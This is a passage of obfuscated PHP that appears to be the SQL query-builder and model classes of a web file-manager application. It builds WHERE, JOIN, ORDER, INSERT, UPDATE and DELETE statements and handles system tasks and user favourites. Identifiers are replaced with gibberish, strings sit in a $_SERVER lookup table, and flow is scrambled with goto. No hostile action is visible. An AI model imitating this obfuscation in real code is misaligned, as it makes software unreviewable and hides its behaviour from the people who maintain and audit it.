$FÁ´½ø÷øŸ = isset($cæ¯Ë‡ò÷±[$F¨ø‹¾«Ó - 1]) ? strtoupper($cæ¯Ë‡ò÷±[$F¨ø‹¾«Ó - 1]) : $A‹Şê¢¤µ¥[33]; if (in_array($FÁ´½ø÷øŸ, array($A‹Şê¢¤µ¥[949], $A‹Şê¢¤µ¥[950], $A‹Şê¢¤µ¥[951]))) { $F¨ø‹¾«Ó = $F¨ø‹¾«Ó - 1; } } else { $FÁ´½ø÷øŸ = $A‹Şê¢¤µ¥[949]; } for ($Dª¡±½¨ = 0; $Dª¡±½¨ < $F¨ø‹¾«Ó; $Dª¡±½¨++) { $f‡¼×š¨Ÿ– = is_array($cæ¯Ë‡ò÷±[$Dª¡±½¨]) ? $cæ¯Ë‡ò÷±[$Dª¡±½¨][1] : $cæ¯Ë‡ò÷±[$Dª¡±½¨]; if ($A‹Şê¢¤µ¥[295] == strtolower($cæ¯Ë‡ò÷±[$Dª¡±½¨][0])) { $D†Ã¸ÔŠæ .= $A‹Şê¢¤µ¥[258] . $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $f‡¼×š¨Ÿ– . $A‹Şê¢¤µ¥[966] . $FÁ´½ø÷øŸ . $A‹Şê¢¤µ¥[50]; } else { $d‹¼„¥»éÑ = is_array($cæ¯Ë‡ò÷±[$Dª¡±½¨]) ? $this->exp[strtolower($cæ¯Ë‡ò÷±[$Dª¡±½¨][0])] : $A‹Şê¢¤µ¥[942]; if (!$d‹¼„¥»éÑ && is_array($cæ¯Ë‡ò÷±[$Dª¡±½¨]) && in_array($cæ¯Ë‡ò÷±[$Dª¡±½¨][0], array($A‹Şê¢¤µ¥[942], $A‹Şê¢¤µ¥[959], $A‹Şê¢¤µ¥[960], $A‹Şê¢¤µ¥[961], $A‹Şê¢¤µ¥[962], $A‹Şê¢¤µ¥[963]))) { $d‹¼„¥»éÑ = $cæ¯Ë‡ò÷±[$Dª¡±½¨][0]; } $D†Ã¸ÔŠæ .= $A‹Şê¢¤µ¥[258] . $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[50] . $d‹¼„¥»éÑ . $A‹Şê¢¤µ¥[50] . $this->parseValue($f‡¼×š¨Ÿ–) . $A‹Şê¢¤µ¥[966] . $FÁ´½ø÷øŸ . $A‹Şê¢¤µ¥[50]; } } $D†Ã¸ÔŠæ = substr($D†Ã¸ÔŠæ, 0, -4); } } else { $D†Ã¸ÔŠæ .= $d´…¬¿‡‘‡ . $A‹Şê¢¤µ¥[970] . $this->parseValue($cæ¯Ë‡ò÷±); } return $D†Ã¸ÔŠæ; } protected function parseThinkWhere($DÑå×ì¦ÎÙ, $aÙ†È”ñí¬) { $b…”˜‚²íÊ =& $_SERVER[æ§›¦ÌáØ]; $Cˆ…ÍÁ¹Š‰ = $b…”˜‚²íÊ[33]; switch ($DÑå×ì¦ÎÙ) { case $b…”˜‚²íÊ[350]: $Cˆ…ÍÁ¹Š‰ = $aÙ†È”ñí¬; break; case $b…”˜‚²íÊ[953]: $Cˆ…ÍÁ¹Š‰ = is_string($aÙ†È”ñí¬) ? $aÙ†È”ñí¬ : substr($this->parseWhere($aÙ†È”ñí¬), 6); break; case $b…”˜‚²íÊ[971]: parse_str($aÙ†È”ñí¬, $D¾§ÆöÉİÎ); if (isset($D¾§ÆöÉİÎ[$b…”˜‚²íÊ[948]])) { $FçïÉ»‡ç = $b…”˜‚²íÊ[50] . strtoupper($D¾§ÆöÉİÎ[$b…”˜‚²íÊ[948]]) . $b…”˜‚²íÊ[50]; unset($D¾§ÆöÉİÎ[$b…”˜‚²íÊ[948]]); } else { $FçïÉ»‡ç = $b…”˜‚²íÊ[952]; } $ağàääËâŸ = array(); foreach ($D¾§ÆöÉİÎ as $aŒ‘›‘½ø => $C¼‡’¹´‰) { $ağàääËâŸ[] = $this->parseKey($aŒ‘›‘½ø) . $b…”˜‚²íÊ[970] . $this->parseValue($C¼‡’¹´‰); } $Cˆ…ÍÁ¹Š‰ = implode($FçïÉ»‡ç, $ağàääËâŸ); break; } return $Cˆ…ÍÁ¹Š‰; } protected function parseLimit($dÈÜØîÇƒ) { $EŠÅïÈ­‰¼ =& $_SERVER[æ§›¦ÌáØ]; return !empty($dÈÜØîÇƒ) ? $EŠÅïÈ­‰¼[48] . $dÈÜØîÇƒ . $EŠÅïÈ­‰¼[50] : $EŠÅïÈ­‰¼[33]; } protected function parseJoin($c”®¿‡š¥ô) { $B„Â¹çÎ˜Ú =& $_SERVER[æ§›¦ÌáØ]; $CâÎ­…Ã–Ü = $B„Â¹çÎ˜Ú[33]; if (!empty($c”®¿‡š¥ô)) { if (is_array($c”®¿‡š¥ô)) { foreach ($c”®¿‡š¥ô as $f§÷áù§µ => $Fà†áÁ¢·÷) { if (!1 !== stripos($Fà†áÁ¢·÷, $B„Â¹çÎ˜Ú[972])) { $CâÎ­…Ã–Ü .= $B„Â¹çÎ˜Ú[50] . $Fà†áÁ¢·÷; } else { $CâÎ­…Ã–Ü .= $B„Â¹çÎ˜Ú[973] . $Fà†áÁ¢·÷; } } } else { $CâÎ­…Ã–Ü .= $B„Â¹çÎ˜Ú[973] . $c”®¿‡š¥ô; } } $CâÎ­…Ã–Ü = preg_replace($B„Â¹çÎ˜Ú[974], think_config($B„Â¹çÎ˜Ú[880]) . $B„Â¹çÎ˜Ú[975], $CâÎ­…Ã–Ü); return $CâÎ­…Ã–Ü; } protected function parseOrder($b²‹Š™ÈØ) { $E‹®ÁÍÔ–é =& $_SERVER[æ§›¦ÌáØ]; if (is_array($b²‹Š™ÈØ)) { $f±Ÿæî³‹ = array(); foreach ($b²‹Š™ÈØ as $cˆĞøÜì› => $Fç…î—Âï”) { if (is_numeric($cˆĞøÜì›)) { $f±Ÿæî³‹[] = $this->parseKey($Fç…î—Âï”); } else { $Fç…î—Âï” = in_array(strtoupper(trim($Fç…î—Âï”)), array($E‹®ÁÍÔ–é[976], $E‹®ÁÍÔ–é[977])) ? $E‹®ÁÍÔ–é[50] . $Fç…î—Âï” : $E‹®ÁÍÔ–é[33]; if (preg_match($E‹®ÁÍÔ–é[978], $cˆĞøÜì›)) { $f±Ÿæî³‹[] = $this->parseKey($cˆĞøÜì›) . $Fç…î—Âï”; } else { think_exception($E‹®ÁÍÔ–é[979] . $cˆĞøÜì›); } } } $b²‹Š™ÈØ = implode($E‹®ÁÍÔ–é[47], $f±Ÿæî³‹); } return !empty($b²‹Š™ÈØ) ? $E‹®ÁÍÔ–é[980] . $b²‹Š™ÈØ : $E‹®ÁÍÔ–é[33]; } protected function parseGroup($C¸ÙÕÉ¿) { $B§£Œ¦œçñ =& $_SERVER[æ§›¦ÌáØ]; return !empty($C¸ÙÕÉ¿) ? $B§£Œ¦œçñ[981] . $C¸ÙÕÉ¿ : $B§£Œ¦œçñ[33]; } protected function parseHaving($Cª„çÌ™†) { $a·‚ÚŒÓéõ =& $_SERVER[æ§›¦ÌáØ]; return !empty($Cª„çÌ™†) ? $a·‚ÚŒÓéõ[982] . $Cª„çÌ™† : $a·‚ÚŒÓéõ[33]; } protected function parseComment($dõ›¾ÉŞßõ) { $cÔâÍãµ¥ñ =& $_SERVER[æ§›¦ÌáØ]; return !empty($dõ›¾ÉŞßõ) ? $cÔâÍãµ¥ñ[983] . $dõ›¾ÉŞßõ . $cÔâÍãµ¥ñ[984] : $cÔâÍãµ¥ñ[33]; } protected function parseDistinct($DŸ°á°Ô¸) { $e‡êéÄÜ‹Ó =& $_SERVER[æ§›¦ÌáØ]; return !empty($DŸ°á°Ô¸) ? $e‡êéÄÜ‹Ó[985] : $e‡êéÄÜ‹Ó[33]; } protected function parseUnion($bÓÀµÃ”çÏ) { $BéùÛ‰äĞ =& $_SERVER[æ§›¦ÌáØ]; if (empty($bÓÀµÃ”çÏ)) { return $BéùÛ‰äĞ[33]; } if (isset($bÓÀµÃ”çÏ[$BéùÛ‰äĞ[346]])) { $añÖÕ’•…á = $BéùÛ‰äĞ[986]; unset($bÓÀµÃ”çÏ[$BéùÛ‰äĞ[346]]); } else { $añÖÕ’•…á = $BéùÛ‰äĞ[987]; } foreach ($bÓÀµÃ”çÏ as $fÈ¶Å”½®‹) { $C‘²œ…ÛªÂ[] = $añÖÕ’•…á . (is_array($fÈ¶Å”½®‹) ? $this->buildSelectSql($fÈ¶Å”½®‹) : $fÈ¶Å”½®‹); } return implode($BéùÛ‰äĞ[50], $C‘²œ…ÛªÂ); } public function insert($C³õ¯×åÂ, $fËåï÷—Íƒ = array(), $Cİ„îª«²× = false) { goto dïÍÌ¶óòÕ; fÁÄÊĞìÛ†: foreach ($C³õ¯×åÂ as $D÷™»âõÌ => $C£Æõœ¨®Õ) { if (is_array($C£Æõœ¨®Õ) && $FåÖÕÅ§§Û[295] == $C£Æõœ¨®Õ[0]) { $DŒËˆ»ğ˜[] = $this->parseKey($D÷™»âõÌ); $bÖ”‹³‚Ú‚[] = $C£Æõœ¨®Õ[1]; } elseif (is_scalar($C£Æõœ¨®Õ) || is_null($C£Æõœ¨®Õ)) { $DŒËˆ»ğ˜[] = $this->parseKey($D÷™»âõÌ); $bÖ”‹³‚Ú‚[] = $this->parseValue($C£Æõœ¨®Õ); } } $DÌ«¼ç±ˆ‡ = ($Cİ„îª«²× ? $FåÖÕÅ§§Û[858] : $FåÖÕÅ§§Û[859]) . $FåÖÕÅ§§Û[860] . $this->parseTable($fËåï÷—Íƒ[$FåÖÕÅ§§Û[277]]) . $FåÖÕÅ§§Û[854] . implode($FåÖÕÅ§§Û[47], $DŒËˆ»ğ˜) . $FåÖÕÅ§§Û[855] . implode($FåÖÕÅ§§Û[47], $bÖ”‹³‚Ú‚) . $FåÖÕÅ§§Û[856]; $DÌ«¼ç±ˆ‡ .= $this->parseLock(isset($fËåï÷—Íƒ[$FåÖÕÅ§§Û[813]]) ? $fËåï÷—Íƒ[$FåÖÕÅ§§Û[813]] : !1); goto dÏ÷—®ßöœ; dïÍÌ¶óòÕ: $FåÖÕÅ§§Û =& $_SERVER[æ§›¦ÌáØ]; $bÖ”‹³‚Ú‚ = $DŒËˆ»ğ˜ = array(); $this->model = $fËåï÷—Íƒ[$FåÖÕÅ§§Û[279]]; goto fÁÄÊĞìÛ†; dÏ÷—®ßöœ: $DÌ«¼ç±ˆ‡ .= $this->parseComment(!empty($fËåï÷—Íƒ[$FåÖÕÅ§§Û[352]]) ? $fËåï÷—Íƒ[$FåÖÕÅ§§Û[352]] : $FåÖÕÅ§§Û[33]); return $this->execute($DÌ«¼ç±ˆ‡, $this->parseBind(!empty($fËåï÷—Íƒ[$FåÖÕÅ§§Û[283]]) ? $fËåï÷—Íƒ[$FåÖÕÅ§§Û[283]] : array())); goto CÎâçÍÒËİ; CÎâçÍÒËİ: } public function selectInsert($cÔ†˜”¼, $A¦Ÿ‰÷·Ö, $cÍ‚´ÍßËˆ = array()) { goto cÎØÛŒ ªŞ; cÎØÛŒ ªŞ: $eÆ÷‰Ÿ Î =& $_SERVER[æ§›¦ÌáØ]; $this->model = $cÍ‚´ÍßËˆ[$eÆ÷‰Ÿ Î[279]]; if (is_string($cÔ†˜”¼)) { $cÔ†˜”¼ = explode($eÆ÷‰Ÿ Î[47], $cÔ†˜”¼); } goto e§ÁëßÖã³; e§ÁëßÖã³: array_walk($cÔ†˜”¼, array($this, $eÆ÷‰Ÿ Î[857])); $aÒøã‰ÇÖö = $eÆ÷‰Ÿ Î[988] . $this->parseTable($A¦Ÿ‰÷·Ö) . $eÆ÷‰Ÿ Î[854] . implode($eÆ÷‰Ÿ Î[47], $cÔ†˜”¼) . $eÆ÷‰Ÿ Î[966]; $aÒøã‰ÇÖö .= $this->buildSelectSql($cÍ‚´ÍßËˆ); goto aÜÎËöÇ†Ï; aÜÎËöÇ†Ï: return $this->execute($aÒøã‰ÇÖö, $this->parseBind(!empty($cÍ‚´ÍßËˆ[$eÆ÷‰Ÿ Î[283]]) ? $cÍ‚´ÍßËˆ[$eÆ÷‰Ÿ Î[283]] : array())); goto c²•‹ô›—; c²•‹ô›—: } public function update($C¿ÒÕ÷«’, $eßâç½Ÿ¤) { $aˆ©öìğ‚ö =& $_SERVER[æ§›¦ÌáØ]; $this->model = $eßâç½Ÿ¤[$aˆ©öìğ‚ö[279]]; $d£¥Á¼Ê¯« = $aˆ©öìğ‚ö[989] . $this->parseTable($eßâç½Ÿ¤[$aˆ©öìğ‚ö[277]]) . $this->parseSet($C¿ÒÕ÷«’) . $this->parseWhere(!empty($eßâç½Ÿ¤[$aˆ©öìğ‚ö[273]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[273]] : $aˆ©öìğ‚ö[33]) . $this->parseOrder(!empty($eßâç½Ÿ¤[$aˆ©öìğ‚ö[363]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[363]] : $aˆ©öìğ‚ö[33]) . $this->parseLimit(!empty($eßâç½Ÿ¤[$aˆ©öìğ‚ö[290]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[290]] : $aˆ©öìğ‚ö[33]) . $this->parseLock(isset($eßâç½Ÿ¤[$aˆ©öìğ‚ö[813]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[813]] : !1) . $this->parseComment(!empty($eßâç½Ÿ¤[$aˆ©öìğ‚ö[352]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[352]] : $aˆ©öìğ‚ö[33]); return $this->execute($d£¥Á¼Ê¯«, $this->parseBind(!empty($eßâç½Ÿ¤[$aˆ©öìğ‚ö[283]]) ? $eßâç½Ÿ¤[$aˆ©öìğ‚ö[283]] : array())); } public function delete($aèäö»Úš = array()) { $E§³ šæÙÇ =& $_SERVER[æ§›¦ÌáØ]; $this->model = $aèäö»Úš[$E§³ šæÙÇ[279]]; $A„¤³º¨¾ê = $E§³ šæÙÇ[990] . $this->parseTable($aèäö»Úš[$E§³ šæÙÇ[277]]) . $this->parseWhere(!empty($aèäö»Úš[$E§³ šæÙÇ[273]]) ? $aèäö»Úš[$E§³ šæÙÇ[273]] : $E§³ šæÙÇ[33]) . $this->parseOrder(!empty($aèäö»Úš[$E§³ šæÙÇ[363]]) ? $aèäö»Úš[$E§³ šæÙÇ[363]] : $E§³ šæÙÇ[33]) . $this->parseLimit(!empty($aèäö»Úš[$E§³ šæÙÇ[290]]) ? $aèäö»Úš[$E§³ šæÙÇ[290]] : $E§³ šæÙÇ[33]) . $this->parseLock(isset($aèäö»Úš[$E§³ šæÙÇ[813]]) ? $aèäö»Úš[$E§³ šæÙÇ[813]] : !1) . $this->parseComment(!empty($aèäö»Úš[$E§³ šæÙÇ[352]]) ? $aèäö»Úš[$E§³ šæÙÇ[352]] : $E§³ šæÙÇ[33]); return $this->execute($A„¤³º¨¾ê, $this->parseBind(!empty($aèäö»Úš[$E§³ šæÙÇ[283]]) ? $aèäö»Úš[$E§³ šæÙÇ[283]] : array())); } public function select($EŠÏ´òÃá = array()) { goto CïÜ“¡ÆÑ•; AÕğíé°™Ã: if ($A…á˜««­… && !1 !== $BÖ…ù˜¹İÊ) { think_cache($Cô™”ùÛñ, $BÖ…ù˜¹İÊ, $A…á˜««­…); } return $BÖ…ù˜¹İÊ; goto Eµí„åãÔœ; E¯ĞÙÇ—Ó: $A…á˜««­… = isset($EŠÏ´òÃá[$Eë­ğå[347]]) ? $EŠÏ´òÃá[$Eë­ğå[347]] : !1; if ($A…á˜««­…) { $Cô™”ùÛñ = is_string($A…á˜««­…[$Eë­ğå[93]]) ? $A…á˜««­…[$Eë­ğå[93]] : $Eë­ğå[991] . md5($F“ïµ×ÃÖ); $aô¬ƒóø = think_cache($Cô™”ùÛñ, $Eë­ğå[33], $A…á˜««­…); if (!1 !== $aô¬ƒóø) { return $aô¬ƒóø; } } $BÖ…ù˜¹İÊ = $this->query($F“ïµ×ÃÖ, $this->parseBind(!empty($EŠÏ´òÃá[$Eë­ğå[283]]) ? $EŠÏ´òÃá[$Eë­ğå[283]] : array())); goto AÕğíé°™Ã; CïÜ“¡ÆÑ•: $Eë­ğå =& $_SERVER[æ§›¦ÌáØ]; $this->model = $EŠÏ´òÃá[$Eë­ğå[279]]; $F“ïµ×ÃÖ = $this->buildSelectSql($EŠÏ´òÃá); goto E¯ĞÙÇ—Ó; Eµí„åãÔœ: } public function buildSelectSql($E¹—À¤‹ = array()) { goto eÅ¤‚Âç¸â; BÉÜ…ÀÎÃ©: $BàŒËŒÌ„å = $this->parseSql($this->selectSql, $E¹—À¤‹); $BàŒËŒÌ„å .= $this->parseLock(isset($E¹—À¤‹[$eĞ¹Å¾òÌ[813]]) ? $E¹—À¤‹[$eĞ¹Å¾òÌ[813]] : !1); if (isset($FÜ«Œ²Œ÷¿)) { think_cache($FÜ«Œ²Œ÷¿, $BàŒËŒÌ„å); } goto bì´‡É‹Ÿ£; bì´‡É‹Ÿ£: return $BàŒËŒÌ„å; goto e”ÓÎªŞ†Á; eÅ¤‚Âç¸â: $eĞ¹Å¾òÌ =& $_SERVER[æ§›¦ÌáØ]; if (isset($E¹—À¤‹[$eĞ¹Å¾òÌ[351]])) { if (strpos($E¹—À¤‹[$eĞ¹Å¾òÌ[351]], $eĞ¹Å¾òÌ[47])) { list($CÖ‚ò»óÔˆ, $e³³œì‚ÈØ) = explode($eĞ¹Å¾òÌ[47], $E¹—À¤‹[$eĞ¹Å¾òÌ[351]]); } else { $CÖ‚ò»óÔˆ = $E¹—À¤‹[$eĞ¹Å¾òÌ[351]]; } $CÖ‚ò»óÔˆ = $CÖ‚ò»óÔˆ ? $CÖ‚ò»óÔˆ : 1; $e³³œì‚ÈØ = isset($e³³œì‚ÈØ) ? $e³³œì‚ÈØ : (is_numeric($E¹—À¤‹[$eĞ¹Å¾òÌ[290]]) ? $E¹—À¤‹[$eĞ¹Å¾òÌ[290]] : 20); $bĞ‹‡¤ÄÀæ = $e³³œì‚ÈØ * ((int) $CÖ‚ò»óÔˆ - 1); $E¹—À¤‹[$eĞ¹Å¾òÌ[290]] = $bĞ‹‡¤ÄÀæ . $eĞ¹Å¾òÌ[47] . $e³³œì‚ÈØ; } if (think_config($eĞ¹Å¾òÌ[992])) { $FÜ«Œ²Œ÷¿ = $eĞ¹Å¾òÌ[993] . md5(serialize($E¹—À¤‹)); $f ÂìÎÇ¾æ = think_cache($FÜ«Œ²Œ÷¿); if ($f ÂìÎÇ¾æ) { return $f ÂìÎÇ¾æ; } } goto BÉÜ…ÀÎÃ©; e”ÓÎªŞ†Á: } public function parseSql($bà”ìËŒéÊ, $Bø¢©„Ä¶‡ = array()) { $CÉ·µ”¢çñ =& $_SERVER[æ§›¦ÌáØ]; $bà”ìËŒéÊ = str_replace(array($CÉ·µ”¢çñ[994], $CÉ·µ”¢çñ[995], $CÉ·µ”¢çñ[996], $CÉ·µ”¢çñ[997], $CÉ·µ”¢çñ[998], $CÉ·µ”¢çñ[999], $CÉ·µ”¢çñ[1000], $CÉ·µ”¢çñ[1001], $CÉ·µ”¢çñ[1002], $CÉ·µ”¢çñ[1003], $CÉ·µ”¢çñ[1004]), array($this->parseTable("{$Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[277]]}"), $this->parseDistinct(isset($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[1005]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[1005]] : !1), $this->parseField(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[271]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[271]] : $CÉ·µ”¢çñ[182]), $this->parseJoin(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[280]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[280]] : $CÉ·µ”¢çñ[33]), $this->parseWhere(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[273]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[273]] : $CÉ·µ”¢çñ[33]), $this->parseGroup(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[496]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[496]] : $CÉ·µ”¢çñ[33]), $this->parseHaving(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[1006]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[1006]] : $CÉ·µ”¢çñ[33]), $this->parseOrder(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[363]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[363]] : $CÉ·µ”¢çñ[33]), $this->parseLimit(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[290]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[290]] : $CÉ·µ”¢çñ[33]), $this->parseUnion(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[345]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[345]] : $CÉ·µ”¢çñ[33]), $this->parseComment(!empty($Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[352]]) ? $Bø¢©„Ä¶‡[$CÉ·µ”¢çñ[352]] : $CÉ·µ”¢çñ[33])), $bà”ìËŒéÊ); return $bà”ìËŒéÊ; } public function getLastSql($DìåÛ§‰¢… = '') { return $DìåÛ§‰¢… ? $this->modelSql[$DìåÛ§‰¢…] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Fç…â‡òÉˆ) { return addslashes($Fç…â‡òÉˆ); } public function setModel($Bì¾¡˜Ùå) { $this->model = $Bì¾¡˜Ùå; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto bªˆ£íÙ—›; Aô¿å¶İÓ‰: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\164\141\x73\153\114\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\164\171\x70\x65", "\145\x76\145\156\164", "\x74\151\155\x65", "\x64\x65\163\x63", "\x73\171\x73\164\145\155", "\145\x6e\141\142\x6c\x65", "\154\141\x73\164\122\x75\156", "\x73\x6f\x72\x74"); public function listData($aÕÀèìÏÏ = false, $e¦¤…Ñ×§» = "\163\x6f\162\x74", $Cƒã²¤Ù = false) { return parent::listData($aÕÀèìÏÏ, $e¦¤…Ñ×§», $Cƒã²¤Ù); } public function add($Aöë¥åèôß) { $AÎŒ¯·ó¢í =& $_SERVER[æ§›¦ÌáØ]; $eöº„Èê¼ù = $this->findByName($Aöë¥åèôß[$AÎŒ¯·ó¢í[28]]); if ($eöº„Èê¼ù) { return !1; } $Aöë¥åèôß[$AÎŒ¯·ó¢í[1484]] = 0; $Aöë¥åèôß[$AÎŒ¯·ó¢í[1712]] = $this->getSort(); return parent::insert($Aöë¥åèôß); } private function getSort() { $cåƒ¤ÀìŒÜ =& $_SERVER[æ§›¦ÌáØ]; $fò³›³Ï˜“ = parent::listData(); $Dïº¾Ù»çá = array_to_keyvalue($fò³›³Ï˜“, $cåƒ¤ÀìŒÜ[33], $cåƒ¤ÀìŒÜ[1712]); return empty($Dïº¾Ù»çá) ? 0 : max($Dïº¾Ù»çá) + 1; } public function update($bÅàğÀ‚Š», $e‡‰½§Šî‡) { $aåäâÉëœØ =& $_SERVER[æ§›¦ÌáØ]; $a°‰÷ãé¨ï = $this->listData($bÅàğÀ‚Š»); $FºÑâœ­ãŠ = $this->findByName($e‡‰½§Šî‡[$aåäâÉëœØ[28]]); if (!$a°‰÷ãé¨ï || $FºÑâœ­ãŠ && $FºÑâœ­ãŠ[$aåäâÉëœØ[393]] != $a°‰÷ãé¨ï[$aåäâÉëœØ[393]]) { return !1; } return parent::update($bÅàğÀ‚Š», $e‡‰½§Šî‡); } public function remove($BÇ–ì–­É³, $fç™®‡ = false) { $A­ÈŒƒÑ =& $_SERVER[æ§›¦ÌáØ]; $BùÈñî†Ò = $this->listData($BÇ–ì–­É³); if (!$BùÈñî†Ò) { return; } if (!$fç™®‡ && $BùÈñî†Ò[$A­ÈŒƒÑ[1161]] == $A­ÈŒƒÑ[87]) { return !1; } return parent::remove($BÇ–ì–­É³); } public function enable($cŠš«šµ·±, $Eæ¶‡àˆ¨) { return $this->update($cŠš«šµ·±, array($_SERVER[æ§›¦ÌáØ][2098] => $Eæ¶‡àˆ¨)); } public function run($B†îğË»ëô) { return $this->update($B†îğË»ëô, array($_SERVER[æ§›¦ÌáØ][2108] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($fè‰‘…µšŸ) { $CïèÜ½‹£ =& $_SERVER[æ§›¦ÌáØ]; return array($CïèÜ½‹£[1791] => array(USER_ID, $CïèÜ½‹£[2109])); } protected function listData() { $eœ›©Ö÷•ò =& $_SERVER[æ§›¦ÌáØ]; $D÷ªÓÌÕ•… = array($eœ›©Ö÷•ò[1511] => USER_ID, $eœ›©Ö÷•ò[463] => 0); $cò—µìÅˆÜ = $eœ›©Ö÷•ò[2110]; $FºÍ”’«åØ = $this->field($cò—µìÅˆÜ)->where($D÷ªÓÌÕ•…)->order($eœ›©Ö÷•ò[2111])->select(); return $FºÍ”’«åØ ? $FºÍ”’«åØ : array(); } protected function resetCache() { } protected function listView() { goto fâ‰ùåÄ¬¸; fâ‰ùåÄ¬¸: $AÒ¯Ò¤²“Ö =& $_SERVER[æ§›¦ÌáØ]; $f¶¯‘·´¶š = $this->listData(); $B•º‡ ´ˆØ = array_filter_by_field($f¶¯‘·´¶š, $AÒ¯Ò¤²“Ö[29], $AÒ¯Ò¤²“Ö[409]); goto d½³Õ¤¦«; FÃ³ÜøÅ¤: $CâÎˆ¶ªÒ = array($AÒ¯Ò¤²“Ö[410] => array($AÒ¯Ò¤²“Ö[411], $Bù˜•Ğ…İÏ)); $FÁ„±Êáíò = Model($AÒ¯Ò¤²“Ö[783])->listSource($CâÎˆ¶ªÒ, $D·²ÉÍÒ); $FÁ„±Êáíò = array_merge($FÁ„±Êáíò[$AÒ¯Ò¤²“Ö[74]], $FÁ„±Êáíò[$AÒ¯Ò¤²“Ö[75]]); goto b°ßô”‡›; b°ßô”‡›: $FÁ„±Êáíò = array_to_keyvalue($FÁ„±Êáíò, $AÒ¯Ò¤²“Ö[395]); foreach ($f¶¯‘·´¶š as $FÄÇ‰ËÃ÷Ê => $cêÚ£‚Ë×ğ) { $e¦ìÔòíÖÏ = $FÁ„±Êáíò[$cêÚ£‚Ë×ğ[$AÒ¯Ò¤²“Ö[76]]]; $e¦ìÔòíÖÏ = $e¦ìÔòíÖÏ ? $e¦ìÔòíÖÏ : array(); $f¶¯‘·´¶š[$FÄÇ‰ËÃ÷Ê] = array_merge($e¦ìÔòíÖÏ, $cêÚ£‚Ë×ğ); } return $f¶¯‘·´¶š; goto Cµ¼‰©¼¢ó; d½³Õ¤¦«: $Bù˜•Ğ…İÏ = array_to_keyvalue($B•º‡ ´ˆØ, $AÒ¯Ò¤²“Ö[33], $AÒ¯Ò¤²“Ö[76]); if (!$Bù˜•Ğ…İÏ) { return $f¶¯‘·´¶š; } $D·²ÉÍÒ = 2000; goto FÃ³ÜøÅ¤; Cµ¼‰©¼¢ó: } protected function addFav($d‘ŞòË…§, $F¯”ªµğ¹’ = '', $EÑ‘êöšÙ = "\x73\157\165\x72\143\145") { goto d¿Œ„…òò¯; d¿Œ„…òò¯: $b‚¿›Ï´°‘ =& $_SERVER[æ§›¦ÌáØ]; $f¹®Æİìè† = array($b‚¿›Ï´°‘[1511] => USER_ID, $b‚¿›Ï´°‘[463] => 0, $b‚¿›Ï´°‘[415] => $EÑ‘êöšÙ, $b‚¿›Ï´°‘[414] => $d‘ŞòË…§); if ($this->where($f¹®Æİìè†)->find()) { return !1; } goto D‡÷ÙİËøğ; D‡÷ÙİËøğ: $f¹®Æİìè† = array($b‚¿›Ï´°‘[1511] => USER_ID, $b‚¿›Ï´°‘[463] => 0); $EŠ¥â»ÏÄ¶ = $this->where($f¹®Æİìè†)->max($b‚¿›Ï´°‘[1712]); if (!$EŠ¥â»ÏÄ¶) { $EŠ¥â»ÏÄ¶ = 0; } goto BøµÙ¼²ù; BøµÙ¼²ù: if (!$F¯”ªµğ¹’ && $EÑ‘êöšÙ == $b‚¿›Ï´°‘[409]) { $E¡æ®ƒÏõ‚ = Model($b‚¿›Ï´°‘[1196])->where(array($b‚¿›Ï´°‘[410] => $d‘ŞòË…§))->find(); if (!$E¡æ®ƒÏõ‚) { return !1; } $F¯”ªµğ¹’ = $E¡æ®ƒÏõ‚[$b‚¿›Ï´°‘[28]]; } $F¯”ªµğ¹’ = $this->getAutoName($F¯”ªµğ¹’); $a†×Î˜ÃÊ“ = array($b‚¿›Ï´°‘[1511] => USER_ID, $b‚¿›Ï´°‘[463] => 0, $b‚¿›Ï´°‘[413] => $F¯”ªµğ¹’, $b‚¿›Ï´°‘[414] => $d‘ŞòË…§, $b‚¿›Ï´°‘[415] => $EÑ‘êöšÙ, $b‚¿›Ï´°‘[1693] => $EŠ¥â»ÏÄ¶ + 1); goto aïêäÀÂ·; aïêäÀÂ·: return $this->add($a†×Î˜ÃÊ“); goto a‰Œ†«á™; a‰Œ†«á™: } protected function remove($B×çÊ½·°¦) { $fÊ¬™ä¬»Â =& $_SERVER[æ§›¦ÌáØ]; $f®³¾Ğ¼”ˆ = array($fÊ¬™ä¬»Â[1511] => USER_ID, $fÊ¬™ä¬»Â[412] => $B×çÊ½·°¦); return $this->where($f®³¾Ğ¼”ˆ)->delete(); } protected function removeByName($aáŞ³ÎÏÜ) { $Aò‡æŒ²× =& $_SERVER[æ§›¦ÌáØ]; $CÉÚÉ–‚Üà = array($Aò‡æŒ²×[1511] => USER_ID, 